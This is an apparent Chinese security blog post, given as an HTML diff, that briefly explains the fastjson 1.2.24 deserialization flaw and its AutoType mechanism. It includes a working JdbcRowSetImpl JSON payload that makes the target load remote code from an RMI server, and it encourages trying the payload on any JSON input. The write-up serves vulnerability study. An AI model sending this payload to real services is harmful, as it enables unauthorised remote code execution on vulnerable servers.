@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言：本文仅讨论fastjson1.2.24及以前的版本（即无过滤的版本），fastjson1.2.24之后的版本陆续增加了限制，本文暂不讨论。  什么是fastjson库？fastjson是阿里开源的一个java库，主要有两个功能：1.序列化：把一个java对象转换为json格式 2.反序列化：将一个json格式的字符串转换为java对象  fastjson库的序列化与java自带的序列化机制的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化漏洞简要分析">
+<meta property="og:url" content="http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="K1ato&#39;s blog">
+<meta property="og:description" content="前言：本文仅讨论fastjson1.2.24及以前的版本（即无过滤的版本），fastjson1.2.24之后的版本陆续增加了限制，本文暂不讨论。  什么是fastjson库？fastjson是阿里开源的一个java库，主要有两个功能：1.序列化：把一个java对象转换为json格式 2.反序列化：将一个json格式的字符串转换为java对象  fastjson库的序列化与java自带的序列化机制的">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-04-23T05:36:02.000Z">
+<meta property="article:modified_time" content="2024-04-23T06:20:34.283Z">
+<meta property="article:author" content="k1ato">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>fastjson反序列化漏洞简要分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/01/22/CommonsCollections%E9%93%BE1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&text=fastjson反序列化漏洞简要分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&title=fastjson反序列化漏洞简要分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&is_video=false&description=fastjson反序列化漏洞简要分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson反序列化漏洞简要分析&body=Check out this article: http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&title=fastjson反序列化漏洞简要分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&title=fastjson反序列化漏洞简要分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&title=fastjson反序列化漏洞简要分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&title=fastjson反序列化漏洞简要分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&name=fastjson反序列化漏洞简要分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&t=fastjson反序列化漏洞简要分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFfastjson%E5%BA%93%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">什么是fastjson库？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson%E6%98%AF%E9%98%BF%E9%87%8C%E5%BC%80%E6%BA%90%E7%9A%84%E4%B8%80%E4%B8%AAjava%E5%BA%93%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%9C%89%E4%B8%A4%E4%B8%AA%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">fastjson是阿里开源的一个java库，主要有两个功能：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson%E5%BA%93%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8Ejava%E8%87%AA%E5%B8%A6%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.2.</span> <span class="toc-text">fastjson库的序列化与java自带的序列化机制的区别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用方式：</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        fastjson反序列化漏洞简要分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">k1ato</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-23T05:36:02.000Z" class="dt-published" itemprop="datePublished">2024-04-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>本文仅讨论fastjson1.2.24及以前的版本（即无过滤的版本），fastjson1.2.24之后的版本陆续增加了限制，本文暂不讨论。</p>
+<hr>
+<h3 id="什么是fastjson库？"><a href="#什么是fastjson库？" class="headerlink" title="什么是fastjson库？"></a>什么是fastjson库？</h3><h4 id="fastjson是阿里开源的一个java库，主要有两个功能："><a href="#fastjson是阿里开源的一个java库，主要有两个功能：" class="headerlink" title="fastjson是阿里开源的一个java库，主要有两个功能："></a>fastjson是阿里开源的一个java库，主要有两个功能：</h4><p>1.序列化：把一个java对象转换为json格式</p>
+<p>2.反序列化：将一个json格式的字符串转换为java对象</p>
+<hr>
+<h4 id="fastjson库的序列化与java自带的序列化机制的区别"><a href="#fastjson库的序列化与java自带的序列化机制的区别" class="headerlink" title="fastjson库的序列化与java自带的序列化机制的区别"></a>fastjson库的序列化与java自带的序列化机制的区别</h4><p>fastjson在序列化以及反序列化的过程中并没有使用java自带的序列化机制，而是自定义了一套机制。其实，对于JSON框架来说，想要把一个java对象转换成字符串，可以有两种选择：</p>
+<p>1.基于setter&#x2F;getter</p>
+<p>2.基于属性（AutoType）</p>
+<p>基于setter&#x2F;getter会带来一些问题，假设有如下两个类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package test;</span><br><span class="line"></span><br><span class="line">class Audi implements Cars&#123;</span><br><span class="line">    private int price;</span><br><span class="line">    //省略setter/getter、toString等</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Benz implements Cars&#123;</span><br><span class="line">    private int price;</span><br><span class="line">    //省略setter/getter、toString等</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实例化对象之后，假设Audi对象的price为10，Audi类对象序列化为json格式后为：</p>
+<p>{“Cars”:{“price”:10}}</p>
+<p>假设Benz对象的price为40,序列化为json格式后为：</p>
+<p>{“Cars”:{“price”:40}}</p>
+<p>当一个类只有一个接口的时候，将这个类的对象序列化的时候，就会将子类抹去（Audi&#x2F;Benz）只保留接口的类型(Cars)，最后导致反序列化时无法得到原始类型。本例中，将两个json再反序列化生成java对象的时候，无法区分原始类是Audi还是Benz。</p>
+<p>为了解决上述问题： fastjson引入了基于属性（AutoType），即在序列化的时候，先把原始类型记录下来。使用@type的键记录原始类型，在本例中，引入AutoType后，Audi类对象序列化为json格式后为：</p>
+<p>{ “Cars”:{ “@type”:”com.test.Audi”, “price”:10 } }</p>
+<p>引入AutoType后，iphone类对象序列化为json格式后为：</p>
+<p>{ “Cars”:{ “@type”:”com.test.Benz”, “price”:40 } }</p>
+<p>这样在反序列化的时候就可以区分原始的类了。</p>
+<hr>
+<h4 id="漏洞利用方式："><a href="#漏洞利用方式：" class="headerlink" title="漏洞利用方式："></a>漏洞利用方式：</h4><p>fastjson在1.2.24及以前的版本，对传入的类是不作任何过滤的，很容易实现RCE，常见的利用类有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用指定服务器上的java类，但是无回显，一般先写一个dnslog.class作为验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://ip:port/XXX&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>凡遇到传输数据有json格式的，都可以试试。</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/130100893">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFfastjson%E5%BA%93%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">什么是fastjson库？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson%E6%98%AF%E9%98%BF%E9%87%8C%E5%BC%80%E6%BA%90%E7%9A%84%E4%B8%80%E4%B8%AAjava%E5%BA%93%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%9C%89%E4%B8%A4%E4%B8%AA%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">fastjson是阿里开源的一个java库，主要有两个功能：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson%E5%BA%93%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8Ejava%E8%87%AA%E5%B8%A6%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.2.</span> <span class="toc-text">fastjson库的序列化与java自带的序列化机制的区别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用方式：</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&text=fastjson反序列化漏洞简要分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&title=fastjson反序列化漏洞简要分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&is_video=false&description=fastjson反序列化漏洞简要分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson反序列化漏洞简要分析&body=Check out this article: http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&title=fastjson反序列化漏洞简要分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&title=fastjson反序列化漏洞简要分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&title=fastjson反序列化漏洞简要分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&title=fastjson反序列化漏洞简要分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&name=fastjson反序列化漏洞简要分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/23/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/&t=fastjson反序列化漏洞简要分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    k1ato
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
